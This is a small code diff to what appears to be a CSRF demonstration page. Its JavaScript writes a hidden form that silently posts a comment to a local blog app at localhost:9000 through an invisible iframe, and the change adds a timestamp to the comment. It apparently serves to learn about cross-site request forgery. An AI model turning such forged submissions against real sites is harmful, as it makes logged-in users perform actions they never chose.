@@ -9,7 +9,7 @@
             document.write(`
             <form method="post" name="commentForm" target="csrf" action="http://localhost:9000/post/addComment">
                 <input type="hidden" name="postId" value="14">
-                <textarea name="content" >来自csrf</textarea>
+                <textarea name="content" >来自csrf -${Date()}</textarea>
             </form>`);
 			var iframe = document.createElement("iframe");
 			iframe.name = "csrf";
